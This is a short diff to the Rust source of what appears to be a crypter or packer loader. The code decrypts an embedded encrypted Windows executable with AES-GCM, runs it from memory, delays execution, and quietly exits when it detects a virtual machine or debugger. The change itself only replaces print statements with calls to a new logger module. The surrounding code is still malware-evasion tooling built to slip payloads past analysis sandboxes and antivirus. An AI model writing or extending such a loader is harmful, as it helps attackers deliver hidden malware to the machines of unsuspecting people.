@@ -1,4 +1,5 @@
 mod generated;
+mod logger;
 use generated::{KEY, NONCE, DELAY_SECS, VERBOSE, VM_DETECTION};
 use std::fs;
 use std::error::Error;
@@ -57,7 +58,7 @@ fn decrypt(ciphertext: &[u8]) -> Result<Vec<u8>, aes_gcm::Error> {
     let plaintext = cipher.decrypt(Nonce::from_slice(&NONCE),ciphertext,)?;
 
     if VERBOSE {
-        println!("[INFO] Binary decrypted successfully.");
+        logger::log_info("Binary decrypted successfully.");
     }
 
     Ok(plaintext)
@@ -68,7 +69,7 @@ fn execute(pe_bytes: &[u8]) -> Result<(), Box<dyn Error>> {
     module.execute_entry_point().map_err(|e| format!("Failed to execute entry point: {e}"))?;
 
     if VERBOSE {
-        println!("[INFO] Target program executed.");
+        logger::log_ok("Target program executed.");
     }
 
     Ok(())
@@ -77,7 +78,7 @@ fn execute(pe_bytes: &[u8]) -> Result<(), Box<dyn Error>> {
 fn delay_execution() {
     if DELAY_SECS > 0 {
         if VERBOSE {
-            println!("[INFO] Delaying execution by {} seconds...", DELAY_SECS);
+            logger::log_info(&format!("Delaying execution by {} seconds...", DELAY_SECS));
         }
 
         std::thread::sleep(std::time::Duration::from_secs(DELAY_SECS));
@@ -91,14 +92,14 @@ fn run() -> Result<(), Box<dyn Error>> {
 
     if VM_DETECTION && vm_detected() {
         if VERBOSE {
-            println!("[INFO] VM detected. Exiting...");
+            logger::log_info("VM detected. Exiting...");
         }
         return Ok(());
     }
 
     if debugger_detected() {
         if VERBOSE {
-            println!("[INFO] Debugger detected. Exiting...");
+            logger::log_info("Debugger detected. Exiting...");
         }
         return Ok(());
     }
@@ -119,7 +120,7 @@ fn run() -> Result<(), Box<dyn Error>> {
 fn main() {
     if let Err(error) = run() {
         if (VERBOSE) {
-            eprintln!("[ERROR] {error}");
+            logger::log_error(&format!("Error: {error}"));
         }
         std::process::exit(1);
     }
